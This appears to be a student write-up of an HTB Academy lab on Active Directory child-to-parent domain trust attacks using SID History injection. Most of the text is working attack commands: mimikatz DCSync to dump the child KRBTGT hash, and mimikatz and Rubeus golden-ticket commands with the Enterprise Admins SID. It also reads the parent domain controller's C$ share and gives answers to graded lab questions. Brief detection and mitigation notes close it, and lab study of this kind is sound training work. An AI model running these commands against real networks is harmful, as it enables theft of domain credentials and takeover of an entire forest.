# ⬆️ **Child → Parent Trust Attacks**

## 🎯 **HTB Academy: Active Directory Enumeration & Attacks**

### 📍 **Overview**

**Child → Parent Trust Attacks** exploit SID History injection to escalate privileges from a compromised child domain to the parent domain within the same forest. This technique leverages the lack of SID filtering protection within forest boundaries, allowing attackers to add Enterprise Admin privileges through Golden Ticket creation with extra SIDs.

---

## 🔗 **SID History Primer**

### **Concept**
- **Purpose**: Migration scenarios - preserve access when users move between domains
- **Mechanism**: Original user's SID added to new account's SID History attribute
- **Token inclusion**: All SIDs in SID History added to user's access token
- **Attack vector**: Inject admin SIDs into controlled account's SID History

### **ExtraSids Attack Requirements**
| Component | Purpose | Example |
|-----------|---------|---------|
| **KRBTGT hash** | Child domain Golden Ticket creation | `9d765b482771505cbe97411065964d5f` |
| **Child domain SID** | Domain identification | `S-1-5-21-2806153819-209893948-922872689` |
| **Target username** | Account for ticket (can be fake) | `hacker` |
| **Child domain FQDN** | Domain specification | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| **Enterprise Admins SID** | Parent domain privilege escalation | `S-1-5-21-3842939050-3880317879-2865463114-519` |

---

## 🔓 **Attack Methodology**

### **Step 1: Gather Required Data**

#### **KRBTGT Hash Extraction**
```powershell
# DCSync attack for KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Key output:
Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

#### **Child Domain SID**
```powershell
# PowerView method
Get-DomainSID
# Output: S-1-5-21-2806153819-209893948-922872689
```

#### **Enterprise Admins SID**
```powershell
# PowerView cross-domain enumeration
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Output: S-1-5-21-3842939050-3880317879-2865463114-519
```

### **Step 2: ExtraSids Attack Execution**

#### **Method 1: Mimikatz Golden Ticket**
```powershell
# Create Golden Ticket with Enterprise Admin privileges
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify ticket in memory
klist
```

#### **Method 2: Rubeus Golden Ticket**
```powershell
# Rubeus equivalent attack
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# Verify ticket in memory
klist
```

### **Step 3: Parent Domain Compromise**
```powershell
# Verify access to parent domain controller
ls \\academy-ea-dc01.inlanefreight.local\c$

# Perform DCSync against parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---

## 🎯 **HTB Academy Lab Solutions**

### **Lab Environment Setup**
```bash
# RDP to target with child domain admin credentials
xfreerdp /v:<target-ip> /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!'
```

### **🔍 Question 1: "What is the SID of the child domain?"**

**Solution:**
```powershell
# Import PowerView and get child domain SID
cd C:\Tools\
Import-Module .\PowerView.ps1
Get-DomainSID

# Alternative: Extract from KRBTGT DCSync output
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Look for "Object Security ID" field
```

**🎯 Answer**: `S-1-5-21-2806153819-209893948-922872689`

### **🏛️ Question 2: "What is the SID of the Enterprise Admins group in the root domain?"**

**Solution:**
```powershell
# Cross-domain Enterprise Admins SID enumeration
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Alternative built-in method:
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

**🎯 Answer**: `S-1-5-21-3842939050-3880317879-2865463114-519`

### **🎫 Question 3: "Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder."**

**Complete Attack Solution:**

**Step 1: Gather Attack Data**
```powershell
# Get KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Extract: 9d765b482771505cbe97411065964d5f

# Get child domain SID  
Get-DomainSID
# Result: S-1-5-21-2806153819-209893948-922872689

# Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
# Result: S-1-5-21-3842939050-3880317879-2865463114-519
```

**Step 2: Execute ExtraSids Attack**
```powershell
# Create Golden Ticket with Enterprise Admin privileges
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify ticket loaded
klist
```

**Step 3: Access Parent Domain and Retrieve Flag**
```powershell
# Access parent domain controller
ls \\academy-ea-dc01.inlanefreight.local\c$

# Navigate to flag location and retrieve contents
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

**🎯 Answer**: `[Flag contents from c:\ExtraSids\flag.txt]`

---

## ⚠️ **Security Implications**

### **Attack Prerequisites**
- **Child domain compromise**: Domain Admin or equivalent privileges required
- **Forest boundary**: Attack works within same AD forest due to SID filtering absence
- **Trust relationship**: Parent-child trust must exist (automatic in forests)

### **Detection Considerations**
- **Golden Ticket indicators**: Long-lived tickets, unusual user accounts
- **Cross-domain access**: Monitor Enterprise Admin group usage
- **SID History modifications**: Audit SID History attribute changes
- **KRBTGT password rotation**: Regular rotation invalidates Golden Tickets

### **Mitigation Strategies**
- **Privileged access management**: Limit child domain admin privileges
- **Monitoring**: Enhanced logging for cross-domain authentication
- **Segmentation**: Consider forest boundary design for high-security environments
- **KRBTGT maintenance**: Regular password rotation and monitoring

---

## 🔑 **Key Takeaways**

### **Attack Flow Summary**
```
Child Domain Compromise → KRBTGT Hash + SIDs → Golden Ticket Creation → Parent Domain Access
    (Domain Admin)        (Attack Data)       (ExtraSids Attack)     (Enterprise Admin)
```

### **Critical Success Factors**
- **SID History exploitation**: Forest-level trust allows SID injection
- **Enterprise Admins SID**: Key to parent domain privilege escalation  
- **Golden Ticket creation**: Both Mimikatz and Rubeus provide capability
- **Cross-domain enumeration**: PowerView enables target identification

### **Professional Impact**
- **Forest compromise**: Child domain breach leads to complete forest control
- **Privilege escalation**: Standard user → Enterprise Admin escalation path
- **Persistence mechanism**: Golden Tickets provide long-term access
- **Assessment value**: Demonstrates trust relationship security implications

**⬆️ Child → Parent trust attacks represent one of the most powerful AD privilege escalation techniques - transforming limited child domain access into complete forest control through SID History exploitation!**

--- 